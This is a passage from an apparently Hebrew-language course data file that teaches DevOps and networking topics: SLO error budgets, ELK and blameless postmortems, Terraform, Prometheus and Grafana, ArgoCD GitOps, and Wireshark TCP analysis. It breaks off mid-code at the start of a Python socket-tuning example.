<p><code>Ops</code> לא "חוסם" — המתמטיקה עושה את זה.</p>
<div class="code-preview"><pre><code># חישוב Error Budget
slo = 99.9  # %
minutes_per_month = 30 * 24 * 60  # = 43,200 דקות
error_budget_minutes = minutes_per_month * (100 - slo) / 100
# = 43.2 דקות downtime מותר בחודש</code></pre></div>
</div>`
      },
      {
        type: "explanation",
        title: "ELK Stack ותרבות Postmortem",
        content: `<div dir="rtl">
<h2>ELK — ניהול לוגים בקנה מידה</h2>
<p><strong><code>ELK</code></strong> — <code>Elasticsearch</code> + <code>Logstash</code> + <code>Kibana</code></p>
<p>המחסנית אוספת, מאחסנת ומציגה מיליארדי שורות לוג במהירות.</p>
<table class="content-table">
  <tr><th>רכיב</th><th>תפקיד</th></tr>
  <tr><td><strong><code>Elasticsearch</code></strong></td><td>מאגר נתונים לחיפוש מהיר — מאחסן לוגים</td></tr>
  <tr><td><strong><code>Logstash</code></strong></td><td>מעבד ומפרמט לוגים מכל מקור</td></tr>
  <tr><td><strong><code>Kibana</code></strong></td><td>UI לחיפוש, dashboards, alerts</td></tr>
  <tr><td><strong><code>Filebeat</code></strong></td><td><code>agent</code> קל על השרתים — שולח לוגים ל-<code>ELK</code></td></tr>
</table>
<h3>תרבות <code>Postmortem</code> — ממוגלה ל-<code>Google</code></h3>
<p>כשמשהו נשבר בפרודקשן — מה עושים?</p>
<p>חברות טובות כותבות <strong><code>Postmortem</code></strong> — <code>blameless</code>:</p>
<ol>
  <li><strong><code>Timeline</code></strong> — מה קרה בדיוק, בכל דקה</li>
  <li><strong><code>Root Cause</code></strong> — מה גרם לתקלה — לא מי!</li>
  <li><strong><code>Impact</code></strong> — כמה משתמשים נפגעו, כמה זמן</li>
  <li><strong><code>Action Items</code></strong> — מה נשנה כדי שזה לא יקרה שוב</li>
</ol>
<p><strong><code>Blameless</code></strong></p>
<p>אנשים לא מפחדים לדווח על תקלות, כי המטרה היא ללמוד — לא להעניש.</p>
<p><code>Google</code> מפרסמת <code>postmortems</code> פנימיים בפומבי.</p>
<p><strong>כישלון שלא לומדים ממנו הוא הכישלון האמיתי.</strong></p>
<p><code>Etsy</code> המציאה את הגישה ב-2012.</p>
<p>היום זה סטנדרט ב-<code>Netflix</code>, <code>Google</code>, <code>Amazon</code> ו-<code>Cloudflare</code>.</p>
</div>`
      }
    ]
  },
  {
    id: 207,
    title: "Terraform ו-Infrastructure as Code",
    pages: [
      {
        type: "explanation",
        title: "מה זה Infrastructure as Code?",
        content: `<div dir="rtl">
<h2>תשתית כקוד — מדוע זה שינה הכל</h2>
<p>פעם, להקים שרת חדש אמר: לפתוח <code>ticket</code> ל-<code>Ops</code>, לחכות שבוע, לצלצל, ולחכות עוד.</p>
<p>היום? מריצים קובץ אחד.</p>
<p>תוך 3 דקות יש <code>EC2 instance</code>, <code>VPC</code>, <code>Security Group</code> ו-<code>DNS record</code> — הכל אוטומטי.</p>
<p><strong>Infrastructure as Code</strong> — בקיצור <code>IaC</code></p>
<p>התשתית מוגדרת בקובצי טקסט ומנוהלת ב-<code>Git</code>, בדיוק כמו קוד אפליקציה.</p>
<p><strong>מה מקבלים?</strong></p>
<p>שלושה יתרונות מרכזיים:</p>
<ul>
<li><code>version history</code> — היסטוריית שינויים מלאה</li>
<li><code>code review</code> — עמיתים בודקים שינויי תשתית</li>
<li><code>CI/CD</code> — העלאה אוטומטית של תשתית</li>
</ul>
<table class="content-table">
  <tr><th>גישה ידנית</th><th>IaC</th></tr>
  <tr><td><code>Click</code> ב-<code>console</code> — לא ניתן לשחזר</td><td>קוד ב-<code>Git</code> — <code>reproducible</code> תמיד</td></tr>
  <tr><td><code>Configuration drift</code> — שרתים שונים</td><td><code>Idempotent</code> — אותה תוצאה בכל הרצה</td></tr>
  <tr><td><code>Snowflake servers</code> — כל שרת ייחודי</td><td><code>Cattle not pets</code> — שרתים זהים</td></tr>
  <tr><td><code>Documentation</code> מיושנת</td><td>הקוד הוא התיעוד</td></tr>
</table>
<p><strong>כלים מובילים</strong></p>
<ul>
<li><code>Terraform</code> — תומך בכל ספק ענן</li>
<li><code>AWS CloudFormation</code> — ל-AWS בלבד</li>
<li><code>Pulumi</code> — כתיבת IaC ב-<code>Python</code> או <code>TypeScript</code></li>
<li><code>Ansible</code> — ניהול הגדרות שרתים</li>
</ul>
</div>`
      },
      {
        type: "explanation",
        title: "Terraform HCL — שפת ההגדרה",
        content: `<div dir="rtl">
<h2>HashiCorp Configuration Language</h2>
<p><strong>HCL</strong> — <code>HashiCorp Configuration Language</code></p>
<p>שפה דקלרטיבית שמתארת מה אתם רוצים, לא איך לבנות אותו.</p>
<p><strong>דוגמה</strong></p>
<p>אתם אומרים "אני רוצה <code>EC2 instance</code> מסוג <code>t3.micro</code>".</p>
<p><code>Terraform</code> מחשב בעצמו מה לבנות, לשנות, או למחוק.</p>
<pre><code>provider "aws" {
  region = "us-east-1"
}

resource "aws_instance" "web" {
  ami           = "ami-0c02fb55956c7d316"
  instance_type = "t3.micro"

  tags = {
    Name = "web-server"
    Env  = "production"
  }
}

output "public_ip" {
  value = aws_instance.web.public_ip
}</code></pre>
<table class="content-table">
  <tr><th>כלי IaC</th><th>Provider support</th><th>שפה</th><th>State</th></tr>
  <tr><td><strong><code>Terraform</code></strong></td><td>700+ <code>providers</code></td><td><code>HCL</code></td><td><code>tfstate</code> file</td></tr>
  <tr><td><strong><code>CloudFormation</code></strong></td><td><code>AWS</code> בלבד</td><td><code>JSON</code>/<code>YAML</code></td><td><code>AWS</code> managed</td></tr>
  <tr><td><strong><code>Pulumi</code></strong></td><td>100+ <code>providers</code></td><td><code>Python</code>/<code>TS</code>/<code>Go</code></td><td><code>Pulumi Cloud</code></td></tr>
</table>
<p><strong>שלושה מרכיבי בסיס</strong></p>
<ul>
<li><strong><code>provider</code></strong> — מגדיר עם מי מדברים — <code>AWS</code>, <code>Azure</code>, <code>GCP</code>, <code>Kubernetes</code></li>
<li><strong><code>resource</code></strong> — מגדיר מה יוצרים</li>
<li><strong><code>output</code></strong> — מייצא ערכים לשימוש חיצוני</li>
</ul>
</div>`
      },
      {
        type: "explanation",
        title: "Terraform State — הזיכרון של התשתית",
        content: `<div dir="rtl">
<h2>State Management — terraform.tfstate</h2>
<p><strong>State</strong></p>
<p>מפה מפורטת בין קוד ה-<code>HCL</code> לבין המשאבים האמיתיים בענן.</p>
<p>בלי <code>state</code>, <code>Terraform</code> לא יכול לדעת מה כבר קיים ומה צריך ליצור.</p>
<pre><code># הפקודות הבסיסיות
terraform init     # הורדת providers
terraform plan     # מה ישתנה (dry run)
terraform apply    # מבצע שינויים
terraform destroy  # מוחק הכל

# state ב-S3 לצוות (remote backend)
terraform {
  backend "s3" {
    bucket = "my-terraform-state"
    key    = "prod/terraform.tfstate"
    region = "us-east-1"
  }
}</code></pre>
<p><strong>הכלל החשוב ביותר</strong></p>
<p>לעולם אל תערכו <code>state</code> ידנית.</p>
<p>אם משאב נוצר מחוץ ל-<code>Terraform</code> בלחיצה ב-console — השתמשו ב-<code>terraform import</code> כדי להכניסו ל-<code>state</code>.</p>
<p><strong>Remote state בצוות</strong></p>
<p>ה-<code>state</code> חייב להיות ב-<code>S3</code> עם <code>DynamoDB locking</code> — לא על המחשב האישי.</p>
<p>שני אנשים שמריצים <code>apply</code> במקביל יגרמו לשחיתות נתונים בלי locking.</p>
</div>`
      },
      {
        type: "story",
        title: "Cattle vs Pets — המטפורה שמסבירה IaC",
        content: `<div dir="rtl">
<h2>כשהשרת נפל — ואיש לא בכה</h2>
<p>ב-2012, Netflix הציגה מטפורה שהפכה לאחד הרעיונות המשפיעים ביותר ב-<code>DevOps</code>.</p>
<p><strong><code>Cattle vs Pets</code></strong> — בקר לעומת חיות מחמד.</p>
<h3>חיות מחמד — Pets</h3>
<ul>
<li>לשרתים יש שמות — "Big Iron", "dev-01"</li>
<li>כשהם חולים, אנשי <code>Ops</code> עושים לילות לבנים כדי לרפא אותם</li>
<li>אם הם מתים — זו טרגדיה</li>
<li>כל שרת ייחודי, מוגדר ידנית, ולא ניתן להחליפו בקלות</li>
</ul>

<h3>בקר — Cattle</h3>
<ul>
<li>לשרתים יש מספרים — "web-047"</li>
<li>כשהם חולים — שוחטים ומחליפים</li>
<li><code>Terraform</code> מייצר instance חדש תוך דקות</li>
<li><code>Auto Scaling Group</code> — אם אחד מת, AWS מייצר אחר אוטומטית</li>
</ul>

<h3><code>Chaos Monkey</code></h3>
<p><code>Netflix</code> פיתחה כלי שמכבה שרתי פרודקשן אקראית במהלך שעות העבודה — בכוונה.</p>
<p>המטרה: לוודא שהמערכת עמידה.</p>
<p>אם זה מכאיב — תתקנו. אם לא — אתם <code>Cattle-ready</code>.</p>

<h3>תשתית <code>Immutable</code></h3>
<p><strong>עיקרון תשתית <code>Immutable</code></strong></p>
<p>לא משנים — רק מחליפים.</p>
<p>זה הלב של <code>IaC</code> מודרני.</p>
<p>טכניקות שמסתמכות על הרעיון הזה:</p>
<ul>
<li><code>blue-green deployments</code></li>
<li><code>canary releases</code></li>
<li><code>zero-downtime updates</code></li>
</ul>
</div>`
      }
    ]
  },
  {
    id: 208,
    title: "Prometheus ו-Grafana — ניטור כמו Google",
    pages: [
      {
        type: "explanation",
        title: "שלושת עמודי Observability",
        content: `<div dir="rtl">
<h2>Metrics, Logs, Traces — המשולש הקדוש</h2>
<p><strong>Observability</strong></p>
<p>כשמשהו משתבש בפרודקשן, אתם צריכים שלושה סוגי מידע שונים.</p>
<p><code>Google</code> קוראת לגישה הזו <strong><code>Observability</code></strong>.</p>
<table class="content-table">
  <tr><th>סוג</th><th>מה זה</th><th>שאלות שעונה</th><th>כלים</th></tr>
  <tr><td><strong><code>Metrics</code></strong></td><td>מספרים לאורך זמן</td><td>"מה המצב עכשיו?"</td><td><code>Prometheus</code>, <code>Datadog</code></td></tr>
  <tr><td><strong><code>Logs</code></strong></td><td>אירועים טקסטואליים</td><td>"מה בדיוק קרה?"</td><td><code>ELK</code>, <code>Loki</code></td></tr>
  <tr><td><strong><code>Traces</code></strong></td><td>מסלול <code>request</code> בין <code>services</code></td><td>"איפה ה-<code>bottleneck</code>?"</td><td><code>Jaeger</code>, <code>Zipkin</code></td></tr>
</table>
<p><strong><code>Prometheus</code></strong></p>
<p>נבנתה ב-<code>SoundCloud</code> ב-2012 והפכה לסטנדרט ב-<code>Kubernetes</code>.</p>
<p>פועלת במודל <code>pull</code> — סורקת כל <code>service</code> ואוספת ממנו <code>metrics</code>.</p>
<p>שומרת ב-<code>time-series database</code>.</p>
<p><strong>מודל הנתונים</strong></p>
<p>כל <code>metric</code> מורכב משם ו-<code>labels</code>.</p>
<p><strong>דוגמה</strong></p>
<p><code>http_requests_total{method="GET", status="200", service="api"}</code></p>
<p>ה-<code>labels</code> מאפשרים סינון וצבירה חזקים.</p>
</div>`
      },
      {
        type: "explanation",
        title: "PromQL — שפת השאילתות",
        content: `<div dir="rtl">
<h2>Prometheus Query Language</h2>
<p><strong>PromQL</strong> — <code>Prometheus Query Language</code></p>
<p>שפת שאילתות לנתוני <code>time-series</code>.</p>
<p>מחשבת <code>rates</code>, <code>aggregations</code> ו-<code>percentiles</code> בזמן אמת.</p>
<pre><code># Rate of HTTP requests per second (5 min window)
rate(http_requests_total[5m])

# 99th percentile latency
histogram_quantile(0.99,
  rate(http_request_duration_seconds_bucket[5m])
)

# Error rate
rate(http_requests_total{status=~"5.."}[5m])
  / rate(http_requests_total[5m])

# Alert: error rate above 1%
ALERT HighErrorRate
  IF error_rate > 0.01
  FOR 5m
  LABELS { severity="critical" }
  ANNOTATIONS { summary = "Error rate above 1%" }</code></pre>
<table class="content-table">
  <tr><th>Method</th><th>Metrics</th><th>שאלה</th></tr>
  <tr><td><strong><code>RED</code></strong> — שירותים</td><td><code>Rate</code>, <code>Errors</code>, <code>Duration</code></td><td>כמה? כשל? כמה זמן?</td></tr>
  <tr><td><strong><code>USE</code></strong> — משאבים</td><td><code>Utilization</code>, <code>Saturation</code>, <code>Errors</code></td><td>שימוש? קיבולת? שגיאות?</td></tr>
</table>
<p><strong><code>RED</code></strong> — שימושי ל-<code>microservices</code></p>
<ul>
<li>כמה בקשות לשנייה?</li>
<li>כמה נכשלות?</li>
<li>מה ה-<code>latency</code>?</li>
</ul>
<p><strong><code>USE</code></strong> — שימושי לתשתית</p>
<ul>
<li>מה צריכת ה-<code>CPU</code>?</li>
<li>מה עומק התור?</li>
<li>כמה שגיאות דיסק?</li>
</ul>
</div>`
      },
      {
        type: "explanation",
        title: "Grafana Dashboards — הסיפור החזותי",
        content: `<div dir="rtl">
<h2>מנתונים ל-Insights ויזואליים</h2>
<p><strong><code>Grafana</code></strong></p>
<p>שכבת הוויזואליזציה שמתחברת ל-<code>Prometheus</code> ולעשרות מקורות נתונים נוספים.</p>
<p><code>Dashboard</code> טוב מספר סיפור.</p>
<p><strong>דוגמה</strong></p>
<p>"כשה-<code>deployment</code> יצא בשעה 14:30, ה-<code>latency</code> עלה ב-40%".</p>
<div class="diagram-container">
<svg direction="ltr" viewBox="0 0 360 130" class="content-diagram">
  <rect x="10" y="10" width="100" height="50" rx="6" fill="#1e293b" stroke="#3b82f6" stroke-width="1.5"/>
  <text x="60" y="30" text-anchor="middle" font-size="10" fill="#93c5fd">Services</text>
  <text x="60" y="46" text-anchor="middle" font-size="9" fill="#64748b">/metrics endpoint</text>
  <rect x="130" y="10" width="100" height="50" rx="6" fill="#1e293b" stroke="#22c55e" stroke-width="1.5"/>
  <text x="180" y="30" text-anchor="middle" font-size="10" fill="#86efac">Prometheus</text>
  <text x="180" y="46" text-anchor="middle" font-size="9" fill="#64748b">scrape + store</text>
  <rect x="250" y="10" width="100" height="50" rx="6" fill="#1e293b" stroke="#f59e0b" stroke-width="1.5"/>
  <text x="300" y="30" text-anchor="middle" font-size="10" fill="#fcd34d">Grafana</text>
  <text x="300" y="46" text-anchor="middle" font-size="9" fill="#64748b">visualize + alert</text>
  <line x1="110" y1="35" x2="130" y2="35" stroke="#3b82f6" stroke-width="1.5" marker-end="url(#arr-prom)"/>
  <line x1="230" y1="35" x2="250" y2="35" stroke="#22c55e" stroke-width="1.5" marker-end="url(#arr-prom)"/>
  <rect x="10" y="80" width="340" height="38" rx="6" fill="#0f172a" stroke="#475569" stroke-width="1"/>
  <text x="180" y="97" text-anchor="middle" font-size="10" fill="#e2e8f0">AlertManager</text>
  <text x="180" y="112" text-anchor="middle" font-size="9" fill="#64748b">PagerDuty / Slack / Email alerts</text>
  <defs><marker id="arr-prom" markerWidth="6" markerHeight="6" refX="3" refY="3" orient="auto"><path d="M0,0 L6,3 L0,6 Z" fill="#94a3b8"/></marker></defs>
</svg>
</div>
<p><strong><code>Best practices</code> ל-<code>dashboard</code></strong></p>
<ul>
<li><strong><code>Golden Signals</code> בראש</strong> — <code>latency</code> / <code>traffic</code> / <code>errors</code> / <code>saturation</code></li>
<li><strong><code>Drill-down</code></strong> — מהתמונה הכללית לפרטים</li>
<li><strong><code>Annotations</code></strong> — סימון <code>deployments</code> על הגרף. כדי לראות קשר בין <code>deploy</code> לשינויי מדדים</li>
</ul>
</div>`
      },
      {
        type: "story",
        title: "הסיפור: Memory Leak שנתפס לפני שהשפיע",
        content: `<div dir="rtl">
<h2>כשהגרף הציל את הפרודקשן</h2>
<p>סטארטאפ <code>SaaS</code> קטן. יום רגיל.</p>
<p><code>Grafana</code> שולחת <code>Slack alert</code>:</p>
<p>"Memory usage ב-<code>service X</code> עולה בקצב קבוע של 2MB לשעה".</p>
<p>לא התראה קריטית — רק <code>warning</code>.</p>
<p>הצוות בדק.</p>
<p>הקוד נראה "clean". ה-<code>unit tests</code> עברו. ה-<code>staging</code> לא הראה שום דבר.</p>
<p>אבל הגרף לא שיקר — קו ישר כלפי מעלה, שמתחיל בדיוק עם ה-deploy של שלשום.</p>
<p>חיפשו ב-<code>profiler</code>.</p>
<p>מה שמצאו: <code>Redis client</code> שנוצר מחדש בכל <code>request</code> ולא נסגר.</p>
<p><code>connection pool</code> עם 10,000 חיבורים פתוחים.</p>
<p>התיקון: 3 שורות קוד. זמן תיקון: 45 דקות.</p>
<p><strong>ללא Prometheus</strong></p>
<p>השירות היה קורס אחרי 4 ימים, בשתיים בלילה, בזמן שיא תנועה.</p>
<p><strong>עם Prometheus</strong></p>
<p>הבעיה זוהתה בשעות העבודה, לפני שהשפיעה על משתמש אחד.</p>
<p><strong>הלקח</strong></p>
<p><code>Monitoring</code> לא מיועד לגלות בעיות כשהן קורות — אלא <strong>לפני שהן קורות</strong>.</p>
<p><code>Trending alerts</code> — ערך שעולה בקצב קבוע — שווים יותר מ-<code>threshold alerts</code>.</p>
<p>Google קוראת לזה:</p>
<p><strong>"Alert on symptoms, not causes"</strong></p>
</div>`
      }
    ]
  },
  {
    id: 209,
    title: "GitOps ו-ArgoCD",
    pages: [
      {
        type: "explanation",
        title: "GitOps — Git כמקור האמת היחיד",
        content: `<div dir="rtl">
<h2>GitOps — מה שב-Git הוא מה שב-Production</h2>
<p><strong><code>GitOps</code></strong></p>
<p>פרקטיקה שבה <strong>כל מצב הפרודקשן מוגדר ב-<code>Git</code></strong>.</p>
<p>לא רק קוד האפליקציה — אלא גם כל ה-<code>Kubernetes manifests</code>, ה-<code>Helm values</code> וה-<code>infrastructure config</code>.</p>
<p><strong>עקרונות GitOps</strong></p>
<ul>
  <li><strong><code>Declarative</code></strong> — מתאר מה רוצים, לא איך לעשות</li>
  <li><strong><code>Versioned</code></strong> — כל שינוי הוא <code>commit</code> — ניתן ל-<code>rollback</code> מיידי</li>
  <li><strong><code>Automated</code></strong> — <code>controller</code> מסנכרן <code>Git</code> ל-<code>cluster</code> אוטומטית</li>
  <li><strong><code>Continuous reconciliation</code></strong> — אם מישהו שינה משהו ב-<code>cluster</code> ידנית — <code>Controller</code> מחזיר למצב ב-<code>Git</code></li>
</ul>
<table class="content-table">
  <tr><th>מודל</th><th><code>Push Deployment</code></th><th><code>Pull</code> (<code>GitOps</code>)</th></tr>
  <tr><td>מי פועל</td><td><code>CI pipeline</code></td><td><code>Controller</code> ב-<code>cluster</code></td></tr>
  <tr><td>הרשאות</td><td><code>CI</code> צריך <code>kubectl access</code></td><td>אין גישה חיצונית ל-<code>cluster</code></td></tr>
  <tr><td><code>Drift</code></td><td>לא מזוהה</td><td>מזוהה ותוקן אוטומטית</td></tr>
  <tr><td><code>Rollback</code></td><td>ידני</td><td><code>git revert</code></td></tr>
</table>
</div>`
      },
      {
        type: "diagram",
        title: "GitOps Loop — מGit ל-Kubernetes",
        content: `<div dir="rtl">
<h2>ArgoCD — GitOps Controller</h2>
<div class="diagram-container">
<svg direction="ltr" viewBox="0 0 360 130" class="content-diagram">
  <rect x="10" y="40" width="80" height="40" rx="6" fill="#1e293b" stroke="#f59e0b" stroke-width="1.5"/>
  <text x="50" y="57" text-anchor="middle" font-size="10" fill="#fcd34d">Git Repo</text>
  <text x="50" y="72" text-anchor="middle" font-size="9" fill="#64748b">manifests</text>
  <rect x="140" y="40" width="80" height="40" rx="6" fill="#1e293b" stroke="#3b82f6" stroke-width="1.5"/>
  <text x="180" y="57" text-anchor="middle" font-size="10" fill="#93c5fd">ArgoCD</text>
  <text x="180" y="72" text-anchor="middle" font-size="9" fill="#64748b">sync + diff</text>
  <rect x="270" y="40" width="80" height="40" rx="6" fill="#1e293b" stroke="#22c55e" stroke-width="1.5"/>
  <text x="310" y="57" text-anchor="middle" font-size="10" fill="#86efac">K8s Cluster</text>
  <text x="310" y="72" text-anchor="middle" font-size="9" fill="#64748b">running state</text>
  <line x1="90" y1="60" x2="140" y2="60" stroke="#f59e0b" stroke-width="1.5" marker-end="url(#arr-argo)"/>
  <text x="115" y="54" text-anchor="middle" font-size="8" fill="#f59e0b">watch</text>
  <line x1="220" y1="60" x2="270" y2="60" stroke="#3b82f6" stroke-width="1.5" marker-end="url(#arr-argo)"/>
  <text x="245" y="54" text-anchor="middle" font-size="8" fill="#3b82f6">apply</text>
  <path d="M310,80 Q310,110 180,110 Q50,110 50,80" fill="none" stroke="#ef4444" stroke-width="1.5" stroke-dasharray="4,3" marker-end="url(#arr-argo-red)"/>
  <text x="180" y="122" text-anchor="middle" font-size="8" fill="#ef4444">drift detected — auto-heal</text>
  <defs>
    <marker id="arr-argo" markerWidth="6" markerHeight="6" refX="3" refY="3" orient="auto"><path d="M0,0 L6,3 L0,6 Z" fill="#94a3b8"/></marker>
    <marker id="arr-argo-red" markerWidth="6" markerHeight="6" refX="3" refY="3" orient="auto"><path d="M0,0 L6,3 L0,6 Z" fill="#ef4444"/></marker>
  </defs>
</svg>
</div>
<pre><code>apiVersion: argoproj.io/v1alpha1
kind: Application
metadata:
  name: my-app
  namespace: argocd
spec:
  project: default
  source:
    repoURL: https://github.com/myorg/my-app
    targetRevision: HEAD
    path: k8s/
  destination:
    server: https://kubernetes.default.svc
    namespace: production
  syncPolicy:
    automated:
      prune: true       # מוחק resources שנמחקו מGit
      selfHeal: true    # מתקן drift אוטומטית</code></pre>
<p><strong><code>ArgoCD</code></strong></p>
<p>מסנכרן כל 3 דקות:</p>
<ul>
<li>שינוי ב-<code>Git</code> — <code>deploy</code> אוטומטי</li>
<li>שינוי ידני ב-<code>cluster</code> — מתוקן אוטומטית למצב ב-<code>Git</code></li>
</ul>
<p>זו ההבטחה של <code>GitOps</code>.</p>
</div>`
      },
      {
        type: "explanation",
        title: "Drift Detection — הביטחון של GitOps",
        content: `<div dir="rtl">
<h2>כשמישהו שינה משהו — ArgoCD יודע</h2>
<p><strong><code>Drift Detection</code></strong></p>
<p>הכוח הגדול ביותר של <code>GitOps</code>.</p>
<p>כל שינוי ב-<code>cluster</code> שלא מגיע מ-<code>Git</code> — <code>ArgoCD</code> מזהה ומדווח.</p>
<p>אם מוגדר <code>selfHeal</code>, הוא מחזיר את המצב אוטומטית.</p>
<pre><code># בדיקת סטטוס אפליקציות
argocd app list

# סנכרון ידני עם diff
argocd app diff my-app
argocd app sync my-app

# Rollback לגרסה קודמת
argocd app rollback my-app 3</code></pre>
<p><strong>מתי GitOps לא מספיק?</strong></p>
<p>כשמדובר ב-<code>Secrets</code>.</p>
<p>לעולם לא מאחסנים סיסמאות ב-<code>Git</code>.</p>
<p><strong>הפתרונות</strong></p>
<ul>
<li><strong><code>Sealed Secrets</code></strong> — מוצפן ב-<code>public key</code>. רק ה-<code>cluster</code> יכול לפענח</li>
<li><strong><code>External Secrets Operator</code></strong> — מושך סודות מ-<code>Vault</code> או <code>AWS Secrets Manager</code></li>
</ul>
<p><strong><code>ApplicationSet</code></strong></p>
<p>תכונה מתקדמת שיוצרת <code>Applications</code> מרובות אוטומטית.</p>
<p>ניתן לייצר אחת לכל <code>namespace</code>, לכל <code>cluster</code>, או לכל <code>feature branch</code>.</p>
<p>מאפשרת ניהול <code>GitOps</code> במרובה אשכולות.</p>
</div>`
      }
    ]
  }
]
  },
  {
    id: 'research',
    title: 'מחקר פרוטוקולים',
    subtitle: 'Wireshark עמוק, BGP, QUIC, eBPF — ניתוח פרוטוקולים',
    icon: '🔬',
    color: '#a855f7',
    level: 'מתקדם',
    chapters: [
  {
    id: 301,
    title: "Wireshark מתקדם",
    pages: [
      {
        type: "explanation",
        title: "קריאת TCP State Machine",
        content: `<div dir="rtl">
<h2>Wireshark — מעבר לצבעים</h2>
<p>רוב האנשים פותחים <code>Wireshark</code> ורואים גל של חבילות צבעוניות.</p>
<p>אנליסטים מקצועיים קוראים <strong>סיפורים</strong> — מה קרה, מתי, ולמה.</p>
<div class="diagram-container">
<svg direction="ltr" viewBox="0 0 360 130" class="content-diagram">
  <text x="180" y="16" text-anchor="middle" font-size="12" fill="#e2e8f0" font-weight="bold">TCP State Machine — החיים של חיבור</text>
  <rect x="10" y="25" width="80" height="22" rx="4" fill="#1e3a5f"/>
  <text x="50" y="40" text-anchor="middle" font-size="10" fill="#7dd3fc">CLOSED</text>
  <rect x="140" y="25" width="80" height="22" rx="4" fill="#166534"/>
  <text x="180" y="40" text-anchor="middle" font-size="10" fill="#86efac">SYN_SENT</text>
  <rect x="270" y="25" width="80" height="22" rx="4" fill="#166534"/>
  <text x="310" y="40" text-anchor="middle" font-size="10" fill="#86efac">SYN_RCVD</text>
  <rect x="140" y="70" width="80" height="22" rx="4" fill="#14532d"/>
  <text x="180" y="85" text-anchor="middle" font-size="10" fill="#4ade80">ESTABLISHED</text>
  <rect x="10" y="70" width="80" height="22" rx="4" fill="#78350f"/>
  <text x="50" y="85" text-anchor="middle" font-size="10" fill="#fcd34d">TIME_WAIT</text>
  <rect x="270" y="70" width="80" height="22" rx="4" fill="#7f1d1d"/>
  <text x="310" y="85" text-anchor="middle" font-size="10" fill="#fca5a5">CLOSE_WAIT</text>
  <line x1="90" y1="36" x2="140" y2="36" stroke="#86efac" stroke-width="1.5" marker-end="url(#arr)"/>
  <text x="115" y="30" text-anchor="middle" font-size="9" fill="#86efac">SYN</text>
  <line x1="220" y1="36" x2="270" y2="36" stroke="#86efac" stroke-width="1.5" marker-end="url(#arr)"/>
  <text x="245" y="30" text-anchor="middle" font-size="9" fill="#86efac">SYN-ACK</text>
  <line x1="180" y1="47" x2="180" y2="70" stroke="#4ade80" stroke-width="1.5" marker-end="url(#arr)"/>
  <text x="200" y="63" font-size="9" fill="#4ade80">ACK</text>
  <line x1="140" y1="81" x2="90" y2="81" stroke="#fcd34d" stroke-width="1.5" marker-end="url(#arr)"/>
  <text x="115" y="76" text-anchor="middle" font-size="9" fill="#fcd34d">FIN</text>
  <defs><marker id="arr" markerWidth="6" markerHeight="6" refX="3" refY="3" orient="auto"><path d="M0,0 L6,3 L0,6 Z" fill="#94a3b8"/></marker></defs>
</svg>
</div>
<table class="content-table">
  <tr><th>State</th><th>משמעות</th><th>מה לחפש</th></tr>
  <tr><td><code>SYN_SENT</code></td><td>הלקוח שלח <code>SYN</code>, מחכה לתגובה</td><td>אם נתקע — השרת או ה-<code>firewall</code> חוסם</td></tr>
  <tr><td><code>ESTABLISHED</code></td><td>חיבור פעיל, נתונים זורמים</td><td>בדוק <code>RTT</code>, <code>window size</code>, <code>retransmissions</code></td></tr>
  <tr><td><code>TIME_WAIT</code></td><td>חיבור נסגר, ממתין 2 כפול <code>MSL</code></td><td>ריבוי <code>TIME_WAIT</code> = בעיית <code>port exhaustion</code></td></tr>
  <tr><td><code>CLOSE_WAIT</code></td><td>הצד הרחוק סגר, הצד המקומי לא</td><td>באג באפליקציה — לא סוגר <code>socket</code></td></tr>
</table>
<p><strong>Filter שימושי</strong></p>
<p><code>tcp.flags.syn == 1 && tcp.flags.ack == 0</code></p>
<p>רואה כל ניסיון חיבור חדש.</p>
</div>`
      },
      {
        type: "explanation",
        title: "Retransmissions ו-CWND",
        content: `<div dir="rtl">
<h2>TCP Congestion Control — מתחת לפני השטח</h2>
<p>כל <code>retransmission</code> ב-<code>Wireshark</code> הוא סימן — משהו השתבש.</p>
<p>להבין מה בדיוק קרה — זו האמנות.</p>
<div class="code-preview"><pre><code># Wireshark display filters לניפוי TCP
tcp.analysis.retransmission          # חבילות שנשלחו מחדש
tcp.analysis.fast_retransmission     # fast retransmit (3 dup-ACK)
tcp.analysis.duplicate_ack           # ACK כפול — אות לאיבוד חבילה
tcp.analysis.zero_window             # receiver buffer מלא — ממתין
tcp.analysis.window_full             # sender מלא את window הנמען
tcp.analysis.out_of_order            # הגיע לא בסדר (jitter/reorder)

# לראות RTT לכל ack:
tcp.analysis.ack_rtt</code></pre></div>
<table class="content-table">
  <tr><th>ממצא</th><th>סיבה אפשרית</th><th>פתרון</th></tr>
  <tr><td>ריבוי <code>Retransmissions</code></td><td>אובדן חבילות, רשת עמוסה</td><td>בדוק <code>interface errors</code>, שדרג קו</td></tr>
  <tr><td><code>Zero Window</code></td><td>האפליקציה לא קוראת מהר מספיק</td><td>כוונן <code>TCP buffers</code>, בדוק עומס <code>CPU</code></td></tr>
  <tr><td><code>RTT</code> גבוה בעקביות</td><td>נתיב ארוך, לוויין, עומס</td><td>השתמש ב-<code>CDN</code> או אלגוריתם <code>BBR</code></td></tr>
  <tr><td><code>Fast Retransmit</code></td><td>חבילה אחת אבדה, הבאות הגיעו</td><td>בדוק מיקום הבעיה — לרוב בשכבה הפיזית</td></tr>
</table>
<p><strong>כלי מובנה</strong></p>
<p><code>Statistics → TCP Stream Graphs → Time-Sequence Graph</code></p>
<p>הגרף מציג את <code>CWND</code> לאורך זמן.</p>
<p>ירידות מופיעות כצניחות חדות.</p>
</div>`
      },
      {
        type: "story",
        title: "הסיפור: 3 שניות שעלו $2M",
        content: `<div dir="rtl">
<h2>כש-<code>latency</code> הורס עסקאות</h2>
<p>חברת <code>fintech</code> ביקשה לנתח תקרית.</p>
<p>כל יום בדיוק ב-9:30 בבוקר — עסקאות מניות נכשלות למשך 3 שניות.</p>
<p>בשלוש הדקות הראשונות של המסחר — הפסד של 2 מיליון דולר ביום.</p>
<p><strong>הניתוח</strong></p>
<p>פתחו <code>Wireshark</code> על הממשק בין שרת ה-<code>trading</code> לבורסה.</p>
<p>Filter: <code>tcp.analysis.retransmission || tcp.analysis.zero_window</code></p>
<p><strong>הממצא</strong></p>
<p>ב-9:30:00 בדיוק — גל של <code>Zero Window</code> משרתי הבורסה.</p>
<p>לא אובדן חבילות — ה-<code>receiver buffer</code> מלא.</p>
<p>הבורסה עצמה נחנקת בנפח פתיחת יום.</p>
<p><strong>הפתרון</strong></p>
<ul>
<li>שינוי ב-<code>TCP buffer sizing</code></li>
<li><code>connection pooling</code></li>
<li><code>staggered reconnect</code> — לא כולם מתחברים מחדש בו-זמנית</li>
</ul>
<p>בשלושה שינויי קוד — הבעיה נעלמה.</p>
<div class="code-preview"><pre><code># Python socket tuning שנוסף
import socket
